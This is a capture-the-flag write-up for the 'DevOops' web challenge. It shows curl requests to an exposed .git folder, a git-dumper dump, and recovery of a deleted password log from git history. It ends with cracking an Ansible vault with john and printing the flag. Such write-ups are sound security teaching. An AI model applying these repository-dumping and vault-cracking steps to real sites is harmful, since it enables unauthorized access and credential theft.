# DevOops

## FR

L'un de vos amis apprend le métier magnifique de DevOps et il vous invite à aller voir son site. 
Il vous dit qu'il est déployé et administré en suivant les pratiques DevOps qu'il a apprise. 
Cependant, il faudrait qu'il travail un peu plus la sécurité...

## EN

One of your friends is learning the wonderful work of DevOps and invites you to check out his site. 
He tells you that it's deployed and managed according to the DevOps practices he's learned. 
However, he needs to work a little harder on security...

https://devoops.flag4all.sh

Auteur : 0xlildoudou (BZHack)

https://devoops.flag4all.sh

## Solve

Got a 403 on .git folder:
```
└─$ curl 'https://devoops.flag4all.sh/.git/' -i
HTTP/2 403 
server: nginx/1.25.2
date: Sun, 22 Oct 2023 02:56:30 GMT
content-type: text/html
content-length: 153
alt-svc: h3=":443";ma=900;
set-cookie: Fuzzzzz=srv_f9b31526358ee8527a97b151bb3ffa9877c2ae4b312325d636323f555eb4a12a; path=/

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.25.2</center>
</body>
</html>
```

But we can still get the HEAD and so remaining of the repository
```
└─$ curl 'https://devoops.flag4all.sh/.git/HEAD' -i
HTTP/2 200 
server: nginx/1.25.2
date: Sun, 22 Oct 2023 02:57:37 GMT
content-type: application/octet-stream
content-length: 23
last-modified: Sun, 08 Oct 2023 13:50:59 GMT
etag: "6522b3c3-17"
accept-ranges: bytes
alt-svc: h3=":443";ma=900;
set-cookie: Fuzzzzz=srv_8e3764354bd1f2bc478366221e074e9125382782e4de6fdc445883887a99a536; path=/
cache-control: private

ref: refs/heads/master

└─$ curl 'https://devoops.flag4all.sh/.git/index' -i
HTTP/2 200 
server: nginx/1.25.2
date: Sun, 22 Oct 2023 02:57:46 GMT
content-type: application/octet-stream
content-length: 305
last-modified: Sun, 08 Oct 2023 13:51:01 GMT
etag: "6522b3c5-131"
accept-ranges: bytes
alt-svc: h3=":443";ma=900;
set-cookie: Fuzzzzz=srv_e9bae9731486be5da883770bdce55c226ce8874448d70bed639eea225d024492; path=/
cache-control: private

Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

```

Dump everything using git-dumper
```
└─$ pip install git-dumper                                                                            
└─$ git-dumper https://devoops.flag4all.sh/.git devoops.flag4all.sh     
```

```
└─$ ll
total 12
-rw-r--r-- 1 kali kali 35 Oct 22 04:58 ansible.cfg
-rw-r--r-- 1 kali kali 27 Oct 22 04:58 index.html
-rw-r--r-- 1 kali kali 66 Oct 22 04:58 playbook.yml
└─$ cat ansible.cfg 
[default]
log_path=stdout_error.log                                                                                                                                └─$ cat playbook.yml 
---
- name:
  ansible.builtin.apt:
    name: '*'
    state: latest                                                                                                                                                                               
```
Nothing interesting locally, lets check the log
```
└─$ git log                                                        
commit fae74d667441a668193e0e25c0e8a89fa91695c0 (HEAD -> master)
Author: 0xlildoudou <0xlildoudou@flag4all.fr>
Date:   Sun Oct 8 13:51:01 2023 +0000

    Remove the vault

commit 3654f3ab8c69f2454bc92c4d0a74658e4bbd1619
Author: 0xlildoudou <0xlildoudou@flag4all.fr>
Date:   Sun Oct 8 13:51:01 2023 +0000

    add more ansible security

commit 69c2e48c84927a7987764868fff94ae1ceb3551e
Author: 0xlildoudou <0xlildoudou@flag4all.fr>
Date:   Sun Oct 8 13:51:00 2023 +0000

    remove log

commit 0a7aad9c7a133ed8def842b5e21b98fb02bfc8b3
Author: 0xlildoudou <0xlildoudou@flag4all.fr>
Date:   Sun Oct 8 13:51:00 2023 +0000

    add update playbook

commit 5f630a81ced302a5d2a1b8cd106ce783726a184f
Author: 0xlildoudou <0xlildoudou@flag4all.fr>
Date:   Sun Oct 8 13:50:59 2023 +0000

    Add index
```
We will checkout on the interesting commit (could also check with `git log -p` but it's easier to retrieve the file)

Before removing the log:
```
└─$ git checkout 0a7aad9c7a133ed8def842b5e21b98fb02bfc8b3
└─$ ls
ansible.cfg  index.html  playbook.yml  stdout_error.log
└─$ cat stdout_error.log 
command '0' not found
command '00' not found
command '000' not found
command '0000' not found
command '00000' not found
command '000000' not found
command '0000000' not found
command '00000000' not found
command '06071992' not found
command '09090' not found
command '0P3N' not found
command '0RACLE' not found
command '0RACLE38' not found
...
command 'xmux' not found
command 'xo11nE' not found
command 'XPRT' not found
command 'xxyyzz' not found
command 'xyzall' not found
command 'xyzzy' not found
command 'year2000' not found
command 'YES' not found
command 'yZgO8Bvj' not found
command 'ZAAADA' not found
command 'zbaaaca' not found
command 'zebra' not found
command 'Zenith' not found
command 'zeosx' not found
command 'zjaaadc' not found
command 'zoomadsl' not found
command 'zxdsl' not found
command 'ZXDSL' not found
```

```
└─$ git checkout 3654f3ab8c69f2454bc92c4d0a74658e4bbd1619
└─$ ll
total 16
-rw-r--r-- 1 kali kali  35 Oct 22 04:58 ansible.cfg
-rw-r--r-- 1 kali kali  27 Oct 22 04:58 index.html
-rw-r--r-- 1 kali kali  66 Oct 22 04:58 playbook.yml
-rw-r--r-- 1 kali kali 484 Oct 22 05:04 vault.txt
└─$ cat vault.txt   
$ANSIBLE_VAULT;1.1;AES256
35333634626634613035353634623737306439616563666463636237333261306435363865386665
3130633139353236303762396363366633363061303466300a336436333130396432396234633530
63306638663834643361613331323535303530336464653766353036386632386531323835666166
6237303966313765320a333236376461626633333830356262303133383530613939646232623434
65643565613365363665343438366563313463333333316163636463613965323630346465326663
6632633765666331363335663838646662626564656334336166
```

We will crack the vault password, rockyou wasn't working so I decided to use what we have in the stdout_error:
```
└─$ ansible2john vault.txt > devops.hash.txt
└─$ cat stdout_error.log | sed "s/.*'\(.*\)'.*/\1/g" > ../devops.wordlist.txt
└─$ john --wordlist=devops.wordlist.txt devops.hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 SSE2 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
netadmin         (vault.txt)     
```

```
└─$ ansible-vault decrypt vault.txt  
Vault password: 
Decryption successful

└─$ cat vault.txt                                                            
FLAG{UsE_4ns1Bl3_WiTh_Strong_P@ssw0rd}
```